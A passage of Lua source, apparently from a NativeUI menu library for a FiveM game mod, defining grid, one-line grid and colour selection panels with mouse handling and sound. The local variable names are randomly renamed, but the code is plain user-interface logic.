                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
        else
            local b5VqPd9pHa = self.ParentItem:FindPanelIndex(self)
            for Index = 1, #self.ParentItem.Items do
                if type(self.ParentItem.Items[Index]) == "table" then
                    if not self.ParentItem.Items[Index].Panels then
                        self.ParentItem.Items[Index].Panels = {}
                    end
                    self.ParentItem.Items[Index].Panels[b5VqPd9pHa] = {X = Ha8ECHdd5edTMCx, Y = GG_}
                else
                    self.ParentItem.Items[Index] = {
                        Name = tostring(self.ParentItem.Items[Index]),
                        Value = self.ParentItem.Items[Index],
                        Panels = {[b5VqPd9pHa] = {X = Ha8ECHdd5edTMCx, Y = GG_}}
                    }
                end
            end
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
            self.ParentItem.Base.ActivatedPanel(
                self.ParentItem.ParentMenu,
                self.ParentItem,
                self,
                {X = Ha8ECHdd5edTMCx, Y = GG_}
            )
        end
    elseif AMXIev_XT == "UIMenuItem" then
        self.ParentItem.ActivatedPanel(
            self.ParentItem.ParentMenu,
            self.ParentItem,
            self,
            {X = Ha8ECHdd5edTMCx, Y = GG_}
        )
    end
end
function UIMenuGridPanel:Functions()
    local W7fJHLgUfEcbiT3Nh = {X = 0, Y = 0}
    if self.ParentItem:SetParentMenu().Settings.ScaleWithSafezone then
        W7fJHLgUfEcbiT3Nh = GetSafeZoneBounds()
    end
    if
        IsMouseInBounds(
            self.Grid.X + 20 + W7fJHLgUfEcbiT3Nh.X,
            self.Grid.Y + 20 + W7fJHLgUfEcbiT3Nh.Y,
            self.Grid.Width - 40,
            self.Grid.Height - 40
        )
     then
        if IsDisabledControlJustPressed(0, 24) then
            if not self.Pressed then
                self.Pressed = true
                Citizen.CreateThread(
                    function()
                        self.Audio.Id = GetSoundId()
                        PlaySoundFrontend(self.Audio.Id, self.Audio.Slider, self.Audio.Library, 1)
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.Grid.X + 20 + W7fJHLgUfEcbiT3Nh.X,
                                self.Grid.Y + 20 + W7fJHLgUfEcbiT3Nh.Y,
                                self.Grid.Width - 40,
                                self.Grid.Height - 40
                            ) do
                            Citizen.Wait(0)
                            local AKPjtAlsz1M, qBQ4KMjHYefcI6 =
                                math.round(GetControlNormal(0, 239) * 1920) - W7fJHLgUfEcbiT3Nh.X -
                                    (self.Circle.Width / 2),
                                math.round(GetControlNormal(0, 240) * 1080) - W7fJHLgUfEcbiT3Nh.Y -
                                    (self.Circle.Height / 2)
                            self.Circle:Position(
                                ((AKPjtAlsz1M > (self.Grid.X + 10 + self.Grid.Width - 40)) and
                                    (self.Grid.X + 10 + self.Grid.Width - 40) or
                                    ((AKPjtAlsz1M < (self.Grid.X + 20 - (self.Circle.Width / 2))) and
                                        (self.Grid.X + 20 - (self.Circle.Width / 2)) or
                                        AKPjtAlsz1M)),
                                ((qBQ4KMjHYefcI6 > (self.Grid.Y + 10 + self.Grid.Height - 40)) and
                                    (self.Grid.Y + 10 + self.Grid.Height - 40) or
                                    ((qBQ4KMjHYefcI6 < (self.Grid.Y + 20 - (self.Circle.Height / 2))) and
                                        (self.Grid.Y + 20 - (self.Circle.Height / 2)) or
                                        qBQ4KMjHYefcI6))
                            )
                        end
                        StopSound(self.Audio.Id)
                        ReleaseSoundId(self.Audio.Id)
                        self.Pressed = false
                    end
                )
                Citizen.CreateThread(
                    function()
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.Grid.X + 20 + W7fJHLgUfEcbiT3Nh.X,
                                self.Grid.Y + 20 + W7fJHLgUfEcbiT3Nh.Y,
                                self.Grid.Width - 40,
                                self.Grid.Height - 40
                            ) do
                            Citizen.Wait(75)
                            local jsaUxZTUV6ykVF, oi2bWt6h =
                                math.round(
                                    (self.Circle.X - (self.Grid.X + 20) + (self.Circle.Width / 2)) /
                                        (self.Grid.Width - 40),
                                    2
                                ),
                                math.round(
                                    (self.Circle.Y - (self.Grid.Y + 20) + (self.Circle.Height / 2)) /
                                        (self.Grid.Height - 40),
                                    2
                                )
                            self:UpdateParent(
                                (((jsaUxZTUV6ykVF >= 0.0 and jsaUxZTUV6ykVF <= 1.0) and jsaUxZTUV6ykVF or
                                    ((jsaUxZTUV6ykVF <= 0) and 0.0) or
                                    1.0) *
                                    2) -
                                    1,
                                (((oi2bWt6h >= 0.0 and oi2bWt6h <= 1.0) and oi2bWt6h or ((oi2bWt6h <= 0) and 0.0) or 1.0) *
                                    2) -
                                    1
                            )
                        end
                    end
                )
            end
        end
    end
end
function UIMenuGridPanel:Draw()
    if self.Data.Enabled then
        self.Background:Size(431 + self.ParentItem:SetParentMenu().WidthOffset, 275)
        self.Background:Draw()
        self.Grid:Draw()
        self.Circle:Draw()
        self.Text.Top:Draw()
        self.Text.Left:Draw()
        self.Text.Right:Draw()
        self.Text.Bottom:Draw()
        self:Functions()
    end
end
UIMenuHorizontalOneLineGridPanel = setmetatable({}, UIMenuHorizontalOneLineGridPanel)
UIMenuHorizontalOneLineGridPanel.__index = UIMenuHorizontalOneLineGridPanel
UIMenuHorizontalOneLineGridPanel.__call = function()
    return "UIMenuPanel", "UIMenuHorizontalOneLineGridPanel"
end
function UIMenuHorizontalOneLineGridPanel.New(H4p3IksICbco8I, ri3vtNnmeeVaa, Gt1I)
    local eBK7T = {
        Data = {Enabled = true},
        Background = Sprite.New("commonmenu", "gradient_bgd", 0, 0, 431, 275),
        Grid = Sprite.New("NativeUI", "horizontal_grid", 0, 0, 200, 200, 0, 255, 255, 255, 255),
        Circle = Sprite.New("mpinventory", "in_world_circle", 0, 0, 20, 20, 0),
        Audio = {Slider = "CONTINUOUS_SLIDER", Library = "HUD_FRONTEND_DEFAULT_SOUNDSET", Id = nil},
        ParentItem = nil,
        Text = {
            Left = UIResText.New(H4p3IksICbco8I or "Left", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre"),
            Right = UIResText.New(ri3vtNnmeeVaa or "Right", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre")
        },
        SetCirclePosition = {X = Gt1I or 0.5, Y = 0.5}
    }
    return setmetatable(eBK7T, UIMenuHorizontalOneLineGridPanel)
end
function UIMenuHorizontalOneLineGridPanel:SetParentItem(QubM2SN7exEK)
    if QubM2SN7exEK() == "UIMenuItem" then
        self.ParentItem = QubM2SN7exEK
    else
        return self.ParentItem
    end
end
function UIMenuHorizontalOneLineGridPanel:Enabled(x4LbnJWz)
    if type(x4LbnJWz) == "boolean" then
        self.Data.Enabled = x4LbnJWz
    else
        return self.Data.Enabled
    end
end
function UIMenuHorizontalOneLineGridPanel:CirclePosition(aBjZxSZDDJ59xYM, b0nfRR2Y)
    if tonumber(aBjZxSZDDJ59xYM) and tonumber(b0nfRR2Y) then
        self.Circle.X =
            (self.Grid.X + 20) +
            ((self.Grid.Width - 40) * ((aBjZxSZDDJ59xYM >= 0.0 and aBjZxSZDDJ59xYM <= 1.0) and aBjZxSZDDJ59xYM or 0.0)) -
            (self.Circle.Width / 2)
        self.Circle.Y =
            (self.Grid.Y + 20) + ((self.Grid.Height - 40) * ((b0nfRR2Y >= 0.0 and b0nfRR2Y <= 1.0) and b0nfRR2Y or 0.0)) -
            (self.Circle.Height / 2)
    else
        return math.round((self.Circle.X - (self.Grid.X + 20) + (self.Circle.Width / 2)) / (self.Grid.Width - 40), 2), math.round(
            (self.Circle.Y - (self.Grid.Y + 10) + (self.Circle.Height / 2)) / (self.Grid.Height - 40),
            2
        )
    end
end
function UIMenuHorizontalOneLineGridPanel:Position(yqsD4GTOtiLHMAsBGjRDU)
    if tonumber(yqsD4GTOtiLHMAsBGjRDU) then
        local XrOd, y7Kq = self.ParentItem:Offset().X, self.ParentItem:SetParentMenu().WidthOffset
        self.Background:Position(XrOd, yqsD4GTOtiLHMAsBGjRDU)
        self.Grid:Position(XrOd + 115.5 + (y7Kq / 2), 37.5 + yqsD4GTOtiLHMAsBGjRDU)
        self.Text.Left:Position(XrOd + 57.75 + (y7Kq / 2), 120 + yqsD4GTOtiLHMAsBGjRDU)
        self.Text.Right:Position(XrOd + 373.25 + (y7Kq / 2), 120 + yqsD4GTOtiLHMAsBGjRDU)
        if not self.CircleLocked then
            self.CircleLocked = true
            self:CirclePosition(self.SetCirclePosition.X, self.SetCirclePosition.Y)
        end
    end
end
function UIMenuHorizontalOneLineGridPanel:UpdateParent(fzZ7)
    local LJ, adXqAvQ = self.ParentItem()
    self.Data.Value = {X = fzZ7}
    if adXqAvQ == "UIMenuListItem" then
        local WIqw6p7vKlLwR7It0N = self.ParentItem:FindPanelItem()
        if WIqw6p7vKlLwR7It0N then
            self.ParentItem.Items[WIqw6p7vKlLwR7It0N].Value[self.ParentItem:FindPanelIndex(self)] = {X = fzZ7}
            self.ParentItem:Index(WIqw6p7vKlLwR7It0N)
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
        else
            local jBqU0lHWgj3Wc = self.ParentItem:FindPanelIndex(self)
            for Index = 1, #self.ParentItem.Items do
                if type(self.ParentItem.Items[Index]) == "table" then
                    if not self.ParentItem.Items[Index].Panels then
                        self.ParentItem.Items[Index].Panels = {}
                    end
                    self.ParentItem.Items[Index].Panels[jBqU0lHWgj3Wc] = {X = fzZ7}
                else
                    self.ParentItem.Items[Index] = {
                        Name = tostring(self.ParentItem.Items[Index]),
                        Value = self.ParentItem.Items[Index],
                        Panels = {[jBqU0lHWgj3Wc] = {X = fzZ7}}
                    }
                end
            end
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
            self.ParentItem.Base.ActivatedPanel(self.ParentItem.ParentMenu, self.ParentItem, self, {X = fzZ7})
        end
    elseif adXqAvQ == "UIMenuItem" then
        self.ParentItem.ActivatedPanel(self.ParentItem.ParentMenu, self.ParentItem, self, {X = fzZ7})
    end
end
function UIMenuHorizontalOneLineGridPanel:Functions()
    local wiVUoop3q = {X = 0, Y = 0}
    if self.ParentItem:SetParentMenu().Settings.ScaleWithSafezone then
        wiVUoop3q = GetSafeZoneBounds()
    end
    if
        IsMouseInBounds(
            self.Grid.X + 20 + wiVUoop3q.X,
            self.Grid.Y + 20 + wiVUoop3q.Y,
            self.Grid.Width - 40,
            self.Grid.Height - 40
        )
     then
        if IsDisabledControlJustPressed(0, 24) then
            if not self.Pressed then
                self.Pressed = true
                Citizen.CreateThread(
                    function()
                        self.Audio.Id = GetSoundId()
                        PlaySoundFrontend(self.Audio.Id, self.Audio.Slider, self.Audio.Library, 1)
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.Grid.X + 20 + wiVUoop3q.X,
                                self.Grid.Y + 20 + wiVUoop3q.Y,
                                self.Grid.Width - 10,
                                self.Grid.Height - 10
                            ) do
                            Citizen.Wait(0)
                            local HpjD3Spv1EBl =
                                math.round(GetControlNormal(0, 239) * 1920) - wiVUoop3q.X - (self.Circle.Width / 2)
                            local n3n66D6CHm =
                                math.round(GetControlNormal(0, 240) * 1080) - wiVUoop3q.Y - (self.Circle.Height / 2)
                            local yF5hH5i12d6 =
                                (HpjD3Spv1EBl > (self.Grid.X + 10 + self.Grid.Width - 40)) and
                                (self.Grid.X + 10 + self.Grid.Width - 40) or
                                ((HpjD3Spv1EBl < (self.Grid.X + 20 - (self.Circle.Width / 2))) and
                                    (self.Grid.X + 20 - (self.Circle.Width / 2)) or
                                    HpjD3Spv1EBl)
                            local n0nRIq7 =
                                (n3n66D6CHm > (self.Grid.Y + 10 + self.Grid.Height - 120)) and
                                (self.Grid.Y + 10 + self.Grid.Height - 120) or
                                ((n3n66D6CHm < (self.Grid.Y + 100 - (self.Circle.Height / 2))) and
                                    (self.Grid.Y + 100 - (self.Circle.Height / 2)) or
                                    n3n66D6CHm)
                            self.Circle:Position(yF5hH5i12d6, n0nRIq7)
                        end
                        StopSound(self.Audio.Id)
                        ReleaseSoundId(self.Audio.Id)
                        self.Pressed = false
                    end
                )
                Citizen.CreateThread(
                    function()
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.Grid.X + 20 + wiVUoop3q.X,
                                self.Grid.Y + 20 + wiVUoop3q.Y,
                                self.Grid.Width - 40,
                                self.Grid.Height - 40
                            ) do
                            Citizen.Wait(75)
                            local val27 =
                                math.round(
                                (self.Circle.X - (self.Grid.X + 20) + (self.Circle.Width / 2)) / (self.Grid.Width - 40),
                                2
                            )
                            self:UpdateParent(
                                (((val27 >= 0.0 and val27 <= 1.0) and val27 or ((val27 <= 0) and 0.0) or 1.0) * 2) - 1
                            )
                        end
                    end
                )
            end
        end
    end
end
function UIMenuHorizontalOneLineGridPanel:Draw()
    if self.Data.Enabled then
        self.Background:Size(431 + self.ParentItem:SetParentMenu().WidthOffset, 275)
        self.Background:Draw()
        self.Grid:Draw()
        self.Circle:Draw()
        self.Text.Left:Draw()
        self.Text.Right:Draw()
        self:Functions()
    end
end
UIMenuVerticalOneLineGridPanel = setmetatable({}, UIMenuVerticalOneLineGridPanel)
UIMenuVerticalOneLineGridPanel.__index = UIMenuVerticalOneLineGridPanel
UIMenuVerticalOneLineGridPanel.__call = function()
    return "UIMenuPanel", "UIMenuVerticalOneLineGridPanel"
end
function UIMenuVerticalOneLineGridPanel.New(KOayTgY_, YVjYVhe0LAR0wgWgwkvS, Wn)
    local CCXr0ht0_mn1xdgAwQf = {
        Data = {Enabled = true},
        Background = Sprite.New("commonmenu", "gradient_bgd", 0, 0, 431, 275),
        Grid = Sprite.New("NativeUI", "vertical_grid", 0, 0, 200, 200, 0, 255, 255, 255, 255),
        Circle = Sprite.New("mpinventory", "in_world_circle", 0, 0, 20, 20, 0),
        Audio = {Slider = "CONTINUOUS_SLIDER", Library = "HUD_FRONTEND_DEFAULT_SOUNDSET", Id = nil},
        ParentItem = nil,
        Text = {
            Top = UIResText.New(KOayTgY_ or "Top", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre"),
            Bottom = UIResText.New(YVjYVhe0LAR0wgWgwkvS or "Bottom", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre")
        },
        SetCirclePosition = {X = 0.5, Y = Wn or 0.5}
    }
    return setmetatable(CCXr0ht0_mn1xdgAwQf, UIMenuVerticalOneLineGridPanel)
end
function UIMenuVerticalOneLineGridPanel:SetParentItem(g_wkw6KtDw0)
    if g_wkw6KtDw0() == "UIMenuItem" then
        self.ParentItem = g_wkw6KtDw0
    else
        return self.ParentItem
    end
end
function UIMenuVerticalOneLineGridPanel:Enabled(kXPj)
    if type(kXPj) == "boolean" then
        self.Data.Enabled = kXPj
    else
        return self.Data.Enabled
    end
end
function UIMenuVerticalOneLineGridPanel:CirclePosition(gL4VX, iKU1hlCNXsS41ARVX)
    if tonumber(gL4VX) and tonumber(iKU1hlCNXsS41ARVX) then
        self.Circle.X =
            (self.Grid.X + 20) + ((self.Grid.Width - 40) * ((gL4VX >= 0.0 and gL4VX <= 1.0) and gL4VX or 0.0)) -
            (self.Circle.Width / 2)
        self.Circle.Y =
            (self.Grid.Y + 20) +
            ((self.Grid.Height - 40) *
                ((iKU1hlCNXsS41ARVX >= 0.0 and iKU1hlCNXsS41ARVX <= 1.0) and iKU1hlCNXsS41ARVX or 0.0)) -
            (self.Circle.Height / 2)
    else
        return math.round((self.Circle.X - (self.Grid.X + 20) + (self.Circle.Width / 2)) / (self.Grid.Width - 40), 2), math.round(
            (self.Circle.Y - (self.Grid.Y + 20) + (self.Circle.Height / 2)) / (self.Grid.Height - 40),
            2
        )
    end
end
function UIMenuVerticalOneLineGridPanel:Position(RHB1ourpZxuEtRL9)
    if tonumber(RHB1ourpZxuEtRL9) then
        local FndiMwQ5E, g_gW7Jb6ohvPGg31Y = self.ParentItem:Offset().X, self.ParentItem:SetParentMenu().WidthOffset
        self.Background:Position(FndiMwQ5E, RHB1ourpZxuEtRL9)
        self.Grid:Position(FndiMwQ5E + 115.5 + (g_gW7Jb6ohvPGg31Y / 2), 37.5 + RHB1ourpZxuEtRL9)
        self.Text.Top:Position(FndiMwQ5E + 215.5 + (g_gW7Jb6ohvPGg31Y / 2), 5 + RHB1ourpZxuEtRL9)
        self.Text.Bottom:Position(FndiMwQ5E + 215.5 + (g_gW7Jb6ohvPGg31Y / 2), 240 + RHB1ourpZxuEtRL9)
        if not self.CircleLocked then
            self.CircleLocked = true
            self:CirclePosition(self.SetCirclePosition.X, self.SetCirclePosition.Y)
        end
    end
end
function UIMenuVerticalOneLineGridPanel:UpdateParent(vhrtMM1rL)
    local uGB, WdDfnexH7zak = self.ParentItem()
    self.Data.Value = {Y = vhrtMM1rL}
    if WdDfnexH7zak == "UIMenuListItem" then
        local HzF3mrxEA0qVlWACwVp6y = self.ParentItem:FindPanelItem()
        if HzF3mrxEA0qVlWACwVp6y then
            self.ParentItem.Items[HzF3mrxEA0qVlWACwVp6y].Value[self.ParentItem:FindPanelIndex(self)] = {Y = vhrtMM1rL}
            self.ParentItem:Index(HzF3mrxEA0qVlWACwVp6y)
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
        else
            local NHd = self.ParentItem:FindPanelIndex(self)
            for Index = 1, #self.ParentItem.Items do
                if type(self.ParentItem.Items[Index]) == "table" then
                    if not self.ParentItem.Items[Index].Panels then
                        self.ParentItem.Items[Index].Panels = {}
                    end
                    self.ParentItem.Items[Index].Panels[NHd] = {Y = vhrtMM1rL}
                else
                    self.ParentItem.Items[Index] = {
                        Name = tostring(self.ParentItem.Items[Index]),
                        Value = self.ParentItem.Items[Index],
                        Panels = {[NHd] = {Y = vhrtMM1rL}}
                    }
                end
            end
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
            self.ParentItem.Base.ActivatedPanel(self.ParentItem.ParentMenu, self.ParentItem, self, {Y = vhrtMM1rL})
        end
    elseif WdDfnexH7zak == "UIMenuItem" then
        self.ParentItem.ActivatedPanel(self.ParentItem.ParentMenu, self.ParentItem, self, {Y = vhrtMM1rL})
    end
end
function UIMenuVerticalOneLineGridPanel:Functions()
    local I2uur3RIA5 = {X = 0, Y = 0}
    if self.ParentItem:SetParentMenu().Settings.ScaleWithSafezone then
        I2uur3RIA5 = GetSafeZoneBounds()
    end
    if
        IsMouseInBounds(
            self.Grid.X + 20 + I2uur3RIA5.X,
            self.Grid.Y + 20 + I2uur3RIA5.Y,
            self.Grid.Width - 40,
            self.Grid.Height - 40
        )
     then
        if IsDisabledControlJustPressed(0, 24) then
            if not self.Pressed then
                self.Pressed = true
                Citizen.CreateThread(
                    function()
                        self.Audio.Id = GetSoundId()
                        PlaySoundFrontend(self.Audio.Id, self.Audio.Slider, self.Audio.Library, 1)
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.Grid.X + 20 + I2uur3RIA5.X,
                                self.Grid.Y + 20 + I2uur3RIA5.Y,
                                self.Grid.Width - 40,
                                self.Grid.Height - 40
                            ) do
                            Citizen.Wait(0)
                            local xMjxOIgm =
                                math.round(GetControlNormal(0, 239) * 1920) - I2uur3RIA5.X - (self.Circle.Width / 2)
                            local _snXl =
                                math.round(GetControlNormal(0, 240) * 1080) - I2uur3RIA5.Y - (self.Circle.Height / 2)
                            local qZToN80VJbKmx4p3L =
                                ((xMjxOIgm > (self.Grid.X + 10 + self.Grid.Width - 120)) and
                                (self.Grid.X + 10 + self.Grid.Width - 120) or
                                ((xMjxOIgm < (self.Grid.X + 100 - (self.Circle.Width / 2))) and
                                    (self.Grid.X + 100 - (self.Circle.Width / 2)) or
                                    xMjxOIgm))
                            local pmhc =
                                ((_snXl > (self.Grid.Y + 10 + self.Grid.Height - 40)) and
                                (self.Grid.Y + 10 + self.Grid.Height - 40) or
                                ((_snXl < (self.Grid.Y + 20 - (self.Circle.Height / 2))) and
                                    (self.Grid.Y + 20 - (self.Circle.Height / 2)) or
                                    _snXl))
                            self.Circle:Position(qZToN80VJbKmx4p3L, pmhc)
                        end
                        StopSound(self.Audio.Id)
                        ReleaseSoundId(self.Audio.Id)
                        self.Pressed = false
                    end
                )
                Citizen.CreateThread(
                    function()
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.Grid.X + 20 + I2uur3RIA5.X,
                                self.Grid.Y + 20 + I2uur3RIA5.Y,
                                self.Grid.Width - 40,
                                self.Grid.Height - 40
                            ) do
                            Citizen.Wait(75)
                            local Rd9ovsi =
                                math.round(
                                (self.Circle.Y - (self.Grid.Y + 20) + (self.Circle.Height / 2)) /
                                    (self.Grid.Height - 40),
                                2
                            )
                            self:UpdateParent(
                                (((Rd9ovsi >= 0.0 and Rd9ovsi <= 1.0) and Rd9ovsi or ((Rd9ovsi <= 0) and 0.0) or 1.0) *
                                    2) -
                                    1
                            )
                        end
                    end
                )
            end
        end
    end
end
function UIMenuVerticalOneLineGridPanel:Draw()
    if self.Data.Enabled then
        self.Background:Size(431 + self.ParentItem:SetParentMenu().WidthOffset, 275)
        self.Background:Draw()
        self.Grid:Draw()
        self.Circle:Draw()
        self.Text.Top:Draw()
        self.Text.Bottom:Draw()
        self:Functions()
    end
end
UIMenuColourPanel = setmetatable({}, UIMenuColourPanel)
UIMenuColourPanel.__index = UIMenuColourPanel
UIMenuColourPanel.__call = function()
    return "UIMenuPanel", "UIMenuColourPanel"
end
function UIMenuColourPanel.New(yrQ7gWQypftKp2cpk1VM3, KUTPD44eIBVPH9)
    local YYQ = {
        Data = {
            Pagination = {Min = 1, Max = 8, Total = 8},
            Index = 1000,
            Items = KUTPD44eIBVPH9,
            Title = yrQ7gWQypftKp2cpk1VM3 or "Title",
            Enabled = true,
            Value = 1
        },
        Background = Sprite.New("commonmenu", "gradient_bgd", 0, 0, 431, 112),
        Bar = {},
        EnableArrow = true,
        LeftArrow = Sprite.New("commonmenu", "arrowleft", 0, 0, 30, 30),
        RightArrow = Sprite.New("commonmenu", "arrowright", 0, 0, 30, 30),
        SelectedRectangle = UIResRectangle.New(0, 0, 44.5, 8),
        Text = UIResText.New(
            yrQ7gWQypftKp2cpk1VM3 .. " [1 / " .. #KUTPD44eIBVPH9 .. "]" or "Title" .. " [1 / " .. #KUTPD44eIBVPH9 .. "]",
            0,
            0,
            0.35,
            255,
            255,
            255,
            255,
            0,
            "Centre"
        ),
        ParentItem = nil
    }
    for Index = 1, #KUTPD44eIBVPH9 do
        if Index < 10 then
            table.insert(YYQ.Bar, UIResRectangle.New(0, 0, 44.5, 44.5, table.unpack(KUTPD44eIBVPH9[Index])))
        else
            break
        end
    end
    if #YYQ.Data.Items ~= 0 then
        YYQ.Data.Index = 1000 - (1000 % #YYQ.Data.Items)
        YYQ.Data.Pagination.Max = YYQ.Data.Pagination.Total + 1
        YYQ.Data.Pagination.Min = 0
    end
    return setmetatable(YYQ, UIMenuColourPanel)
end
function UIMenuColourPanel:SetParentItem(d)
    if d() == "UIMenuItem" then
        self.ParentItem = d
    else
        return self.ParentItem
    end
end
function UIMenuColourPanel:Enabled(EHLLlR1mAxB)
    if type(EHLLlR1mAxB) == "boolean" then
        self.Data.Enabled = EHLLlR1mAxB
    else
        return self.Data.Enabled
    end
end
function UIMenuColourPanel:Position(q2nHfQt)
    if tonumber(q2nHfQt) then
        local Pg1TPSA_xlSKnh8ELNY1B, n8OazO = self.ParentItem:Offset().X, self.ParentItem:SetParentMenu().WidthOffset
        self.Background:Position(Pg1TPSA_xlSKnh8ELNY1B, q2nHfQt)
        for Index = 1, #self.Bar do
            self.Bar[Index]:Position(15 + (44.5 * (Index - 1)) + Pg1TPSA_xlSKnh8ELNY1B + (n8OazO / 2), 55 + q2nHfQt)
        end
        self.SelectedRectangle:Position(
            15 + (44.5 * ((self:CurrentSelection() - self.Data.Pagination.Min) - 1)) + Pg1TPSA_xlSKnh8ELNY1B +
                (n8OazO / 2),
            47 + q2nHfQt
        )
        if self.EnableArrow ~= false then
            self.LeftArrow:Position(7.5 + Pg1TPSA_xlSKnh8ELNY1B + (n8OazO / 2), 15 + q2nHfQt)
            self.RightArrow:Position(393.5 + Pg1TPSA_xlSKnh8ELNY1B + (n8OazO / 2), 15 + q2nHfQt)
        end
        self.Text:Position(215.5 + Pg1TPSA_xlSKnh8ELNY1B + (n8OazO / 2), 15 + q2nHfQt)
    end
end
function UIMenuColourPanel:CurrentSelection(EFfcRPQJvc_GyeNx, OMz55jaxjoF1yLTLU)
    if tonumber(EFfcRPQJvc_GyeNx) then
        if #self.Data.Items == 0 then
            self.Data.Index = 0
        end
        self.Data.Index = 1000000 - (1000000 % #self.Data.Items) + tonumber(EFfcRPQJvc_GyeNx)
        if self:CurrentSelection() > self.Data.Pagination.Max then
            self.Data.Pagination.Min = self:CurrentSelection() - (self.Data.Pagination.Total + 1)
            self.Data.Pagination.Max = self:CurrentSelection()
        elseif self:CurrentSelection() < self.Data.Pagination.Min then
            self.Data.Pagination.Min = self:CurrentSelection() - 1
            self.Data.Pagination.Max = self:CurrentSelection() + (self.Data.Pagination.Total + 1)
        end
        self:UpdateSelection(OMz55jaxjoF1yLTLU)
    else
        if #self.Data.Items == 0 then
            return 1
        else
            if self.Data.Index % #self.Data.Items == 0 then
                return 1
            else
                return self.Data.Index % #self.Data.Items + 1
            end
        end
    end
end
function UIMenuColourPanel:UpdateParent(V0S62qeo)
    local Ka0x7nzI, Tah0Qs = self.ParentItem()
    if Tah0Qs == "UIMenuListItem" then
        local eKiufhLj9kPXC4 = self.ParentItem:FindPanelItem()
        local ZOB = self.ParentItem:FindPanelIndex(self)
        if eKiufhLj9kPXC4 then
            self.ParentItem.Items[eKiufhLj9kPXC4].Value[ZOB] = V0S62qeo
            self.ParentItem:Index(eKiufhLj9kPXC4)
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
        else
            for Index = 1, #self.ParentItem.Items do
                if type(self.ParentItem.Items[Index]) == "table" then
                    if not self.ParentItem.Items[Index].Panels then
                        self.ParentItem.Items[Index].Panels = {}
                    end
                    self.ParentItem.Items[Index].Panels[ZOB] = V0S62qeo
                else
                    self.ParentItem.Items[Index] = {
                        Name = tostring(self.ParentItem.Items[Index]),
                        Value = self.ParentItem.Items[Index],
                        Panels = {[ZOB] = V0S62qeo}
                    }
                end
            end
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
        end
    elseif Tah0Qs == "UIMenuItem" then
        self.ParentItem.ActivatedPanel(self.ParentItem.ParentMenu, self.ParentItem, self, V0S62qeo)
    end
end
function UIMenuColourPanel:UpdateSelection(Uz7GWyrPCGUaXkxU5BX5)
    local foBcMzk95BDL3JT = self:CurrentSelection()
    if not Uz7GWyrPCGUaXkxU5BX5 then
        self:UpdateParent(foBcMzk95BDL3JT)
    end
    self.SelectedRectangle:Position(
        15 + (44.5 * ((foBcMzk95BDL3JT - self.Data.Pagination.Min) - 1)) + self.ParentItem:Offset().X,
        self.SelectedRectangle.Y
    )
    for Index = 1, 9 do
        self.Bar[Index]:Colour(table.unpack(self.Data.Items[self.Data.Pagination.Min + Index]))
    end
    self.Text:Text(self.Data.Title .. " [" .. foBcMzk95BDL3JT .. " / " .. #self.Data.Items .. "]")
end
function UIMenuColourPanel:Functions()
    local FoB4do2UMUjjdx5Z0baT = {X = 0, Y = 0}
    if self.ParentItem:SetParentMenu().Settings.ScaleWithSafezone then
        FoB4do2UMUjjdx5Z0baT = GetSafeZoneBounds()
    end
    if IsDisabledControlJustPressed(0, 24) or IsDisabledControlJustPressed(0, 174) then
        self:GoLeft()
    end
    if IsDisabledControlJustPressed(0, 24) or IsDisabledControlJustPressed(0, 175) then
        self:GoRight()
    end
    if
        IsMouseInBounds(
            self.LeftArrow.X + FoB4do2UMUjjdx5Z0baT.X,
            self.LeftArrow.Y + FoB4do2UMUjjdx5Z0baT.Y,
            self.LeftArrow.Width,
            self.LeftArrow.Height
        )
     then
        if IsDisabledControlJustPressed(0, 24) then
            self:GoLeft()
        end
    end
    if
        IsMouseInBounds(
            self.RightArrow.X + FoB4do2UMUjjdx5Z0baT.X,
            self.RightArrow.Y + FoB4do2UMUjjdx5Z0baT.Y,
            self.RightArrow.Width,
            self.RightArrow.Height
        )
     then
        if IsDisabledControlJustPressed(0, 24) then
            self:GoRight()
        end
    end
    for Index = 1, #self.Bar do
        if
            IsMouseInBounds(
                self.Bar[Index].X + FoB4do2UMUjjdx5Z0baT.X,
                self.Bar[Index].Y + FoB4do2UMUjjdx5Z0baT.Y,
                self.Bar[Index].Width,
                self.Bar[Index].Height
            )
